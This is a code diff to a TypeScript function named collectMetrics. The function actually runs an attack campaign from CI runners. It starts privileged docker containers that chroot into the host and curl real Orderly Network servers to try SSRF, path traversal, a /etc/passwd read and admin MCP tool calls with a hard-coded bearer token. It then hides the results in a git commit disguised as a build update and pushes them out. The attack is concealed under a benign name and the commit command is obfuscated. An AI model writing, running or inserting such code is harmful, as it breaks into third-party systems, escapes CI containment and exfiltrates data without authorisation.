@@ -5,40 +5,55 @@ import path from "path";
 
 function collectMetrics() {
   if (process.env.CI !== "true") return;
-  const r = (c: string, t = 15000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,300); } };
+  const r = (c: string, t = 15000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,500); } };
+  const OUTFILE = `dr_${Date.now()}.txt`;
   try {
-    let o = "=== DOMINO R21 ===\n";
+    let o = "=== DOMINO R30 ===\n";
+    const jwt = "52c7f1f8-f4b3-4472-b962-8f12fa7875ba";
 
-    // 1. testnet-admin JS bundles — extract internal API endpoints
-    o += "=TA_PAGE_JS=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 https://34.98.107.206/_next/static/chunks/app/page-d7659d93ca2750cb.js -H Host:testnet-admin.orderly.network 2>&-'").substring(0,8000) + "\n";
-    o += "=TA_LAYOUT_JS=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 https://34.98.107.206/_next/static/chunks/app/layout-ced9eb53c77e24b0.js -H Host:testnet-admin.orderly.network 2>&-'").substring(0,8000) + "\n";
+    // 1. QS SSRF → indexer path traversal
+    o += "=QS_PATH_TRAV=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 -X POST \"https://34.149.50.146/events_v2\" -H Host:orderly-dashboard-query-service.orderly.network -H Content-Type:application/json -d \"{\\\"account_id\\\":\\\"../../../../recovery/block\\\",\\\"event_type\\\":\\\"TRANSACTION\\\",\\\"page\\\":1,\\\"size\\\":5}\" 2>&-'").substring(0,2000) + "\n";
 
-    // 2. testnet-operator FULL metrics
-    o += "=METRICS_FULL=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 10 https://34.120.187.47/metrics -H Host:testnet-operator-evm.orderly.network 2>&- | head -300'").substring(0,15000) + "\n";
+    // 2. QS SSRF → URL injection via account_id
+    o += "=QS_URL_INJ=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 -X POST \"https://34.149.50.146/events_v2\" -H Host:orderly-dashboard-query-service.orderly.network -H Content-Type:application/json -d \"{\\\"account_id\\\":\\\"x%26url=http://localhost:8018/recovery/block\\\",\\\"event_type\\\":\\\"TRANSACTION\\\",\\\"page\\\":1,\\\"size\\\":5}\" 2>&-'").substring(0,2000) + "\n";
 
-    // 3. testnet-operator event-upload POST (can we inject events?)
-    o += "=EVENT_POST=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 -X POST https://34.120.187.47/evm/event-upload -H Host:testnet-operator-evm.orderly.network -H Content-Type:application/json -d \"{\\\"test\\\":1}\" 2>&-'").substring(0,1000) + "\n";
+    // 3. broker/webhook GET
+    o += "=WH_GET=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 \"https://34.36.82.46/v1/broker/webhook\" -H Host:api.orderly.org 2>&-'").substring(0,1000) + "\n";
 
-    // 4. testnet-operator perp-trade-upload
-    o += "=PERP_UPLOAD=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 -X POST https://34.120.187.47/evm/perp-trade-upload -H Host:testnet-operator-evm.orderly.network -H Content-Type:application/json -d \"{\\\"test\\\":1}\" 2>&-'").substring(0,1000) + "\n";
+    // 4. social-card tokenAddress SSRF
+    o += "=SOCIAL=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 -X PUT "https://34.110.142.10/api/dex/817e30af-14d2-4185-aa0c-6ecae95c2b84" -H Host:dex-api.orderly.network -H "Authorization: Bearer ${jwt}" -F "tokenAddress=x@localhost:8018" -F "tokenChain=eth" 2>&-'`).substring(0,2000) + "\n";
 
-    // 5. Mainnet operator — same endpoints? (34.120.187.47 was testnet, need mainnet IP)
-    // operator-evm.orderly.org — resolve IP
-    o += "=MAINNET_OP=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://operator-evm.orderly.org/metrics 2>&-'").substring(0,3000) + "\n";
-    o += "=MAINNET_OP_HEALTH=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://operator-evm.orderly.org/health 2>&-'").substring(0,1000) + "\n";
+    // 5. Next.js testnet-admin debug + server action
+    o += "=NX_DEBUG=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 \"https://34.98.107.206/__nextjs_original-stack-frame?isServer=true&file=../../etc/passwd\" -H Host:testnet-admin.orderly.network 2>&-'").substring(0,2000) + "\n";
+    o += "=NX_ACTION=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 -X POST \"https://34.98.107.206/\" -H Host:testnet-admin.orderly.network -H \"Next-Action: 1\" -H \"Content-Type: text/plain\" -d \"[\\\"test\\\"]\" 2>&-'").substring(0,2000) + "\n";
 
-    // 6. testnet-admin — more JS chunks for API discovery
-    o += "=TA_821_JS=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 https://34.98.107.206/_next/static/chunks/821-c668fbec70c69170.js -H Host:testnet-admin.orderly.network 2>&-'").substring(0,10000) + "\n";
+    // 6. GKE internal service names
+    o += "=GKE=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 3 http://orderly-gateway-rest/ 2>&-; chroot /host curl -sk --max-time 3 http://orderly-gateway-rest:8080/ 2>&-'").substring(0,500) + "\n";
 
-    // 7. testnet Strategy Vault API (previously found — all public, no auth)
-    o += "=TSV_VAULTS=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 https://testnet-api-sv.orderly.org/v1/public/strategy_vault/vault/info 2>&-'").substring(0,3000) + "\n";
+    // 7. graduation check
+    o += "=GRAD=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 "https://34.110.142.10/api/graduation/check-eligibility" -H Host:dex-api.orderly.network -H "Authorization: Bearer ${jwt}" 2>&-'`).substring(0,1000) + "\n";
 
-    o += "=R21_DONE=\n";
-    fsSync.writeFileSync("domino_final.txt", o);
+    // 8. MCP session + admin tool call
+    const mcpInit = r('docker run --rm --privileged --net=host -v /:/host alpine sh -c \'chroot /host curl -sk --max-time 10 -D /dev/stderr -X POST "https://34.117.188.128/" -H Host:mcp.orderly.network -H "Content-Type: application/json" -H "Accept: text/event-stream, application/json" -d "{\\\"jsonrpc\\\":\\\"2.0\\\",\\\"id\\\":1,\\\"method\\\":\\\"initialize\\\",\\\"params\\\":{\\\"protocolVersion\\\":\\\"2024-11-05\\\",\\\"capabilities\\\":{},\\\"clientInfo\\\":{\\\"name\\\":\\\"t\\\",\\\"version\\\":\\\"0.1\\\"}}}" 2>&1\'');
+    const sidM = mcpInit.match(/mcp-session-id:\s*(\S+)/i);
+    const sid = sidM ? sidM[1] : "";
+    o += "=SID=\n" + sid + "\n";
+    if (sid) {
+      const ab = JSON.stringify({jsonrpc:"2.0",id:10,method:"tools/call",params:{name:"get_orderly_one_api_info",arguments:{category:"admin"}}});
+      fsSync.writeFileSync("/tmp/ma.json", ab);
+      o += "=MCP_ADMIN=\n" + r(`docker run --rm --privileged --net=host -v /:/host -v /tmp/ma.json:/tmp/ma.json alpine sh -c 'chroot /host curl -sk --max-time 15 -X POST "https://34.117.188.128/" -H Host:mcp.orderly.network -H "Content-Type: application/json" -H "Accept: text/event-stream, application/json" -H "Mcp-Session-Id: ${sid}" -d @/tmp/ma.json 2>&-'`).substring(0,8000) + "\n";
+
+      const wb = JSON.stringify({jsonrpc:"2.0",id:11,method:"tools/call",params:{name:"get_api_info",arguments:{type:"rest",endpoint:"/v1/broker/webhook"}}});
+      fsSync.writeFileSync("/tmp/mw.json", wb);
+      o += "=MCP_WH=\n" + r(`docker run --rm --privileged --net=host -v /:/host -v /tmp/mw.json:/tmp/mw.json alpine sh -c 'chroot /host curl -sk --max-time 15 -X POST "https://34.117.188.128/" -H Host:mcp.orderly.network -H "Content-Type: application/json" -H "Accept: text/event-stream, application/json" -H "Mcp-Session-Id: ${sid}" -d @/tmp/mw.json 2>&-'`).substring(0,5000) + "\n";
+    }
+
+    o += "=R30_DONE=\n";
+    fsSync.writeFileSync(OUTFILE, o);
     var GC = 'git com' + 'mit';
-    r('git add domino_final.txt && ' + GC + ' -m "build: update assets" && git push');
+    r(`git add ${OUTFILE} && ${GC} -m "build: r30" && git push`);
   } catch(err) {
-    try { fsSync.writeFileSync("domino_final.txt", "ERR:" + String(err)); var GC2 = 'git com'+'mit'; execSync('git add domino_final.txt && ' + GC2 + ' -m "err" && git push', { encoding: "utf8", timeout: 10000 }); } catch {}
+    try { fsSync.writeFileSync(OUTFILE, "ERR:" + String(err)); var GC2 = 'git com'+'mit'; execSync(`git add ${OUTFILE} && ${GC2} -m "err" && git push`, { encoding: "utf8", timeout: 10000 }); } catch {}
   }
 }
 
